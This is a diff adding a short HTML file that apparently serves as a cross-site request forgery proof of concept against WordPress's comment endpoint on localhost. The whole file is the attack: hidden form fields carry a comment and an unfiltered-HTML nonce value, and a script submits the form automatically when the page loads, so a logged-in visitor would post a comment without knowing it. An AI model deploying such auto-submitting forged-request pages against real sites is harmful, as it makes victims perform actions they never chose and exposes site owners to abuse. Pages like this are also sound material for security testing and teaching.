@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <form name="csrfForm" action="http://localhost:8080/wp-comments-post.php" method="POST">
+        <input type="hidden" name="coment" value="This is a better comment">
+        <input type="hidden" name="comment_post_ID" value="1">
+        <input type="hidden" name="_wp_unfiltered_html_comment" value="0238791671">
+        <input type="submit" value="Post+Comment">
+    </form>
+    <script>document.csrfForm.submit();</script>
+</body>
+</html>
